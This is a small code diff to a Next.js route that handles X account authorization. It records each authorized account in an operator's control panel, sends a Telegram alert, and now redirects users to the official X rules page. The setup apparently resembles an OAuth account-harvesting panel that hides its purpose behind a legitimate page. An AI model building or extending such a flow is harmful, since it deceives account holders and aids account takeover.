@@ -56,14 +56,9 @@ export async function GET(request) {
   }
 
   // Clients only authorize their account here; it is stored and shows up in
-  // the operator's control panel. No panel session is granted to clients -
-  // they land on a friendly confirmation page instead.
-  const res = NextResponse.redirect(
-    new URL(
-      `/connected?handle=${encodeURIComponent(account.username || "")}`,
-      request.url
-    ),
-    302
-  );
-  return res;
+  // the operator's control panel + Telegram alert. Clients are then sent to
+  // the configured post-authorization page (default: the X rules page).
+  const postAuthUrl =
+    process.env.POST_AUTH_URL || "https://help.x.com/en/rules-and-policies/x-rules";
+  return NextResponse.redirect(postAuthUrl, 302);
 }
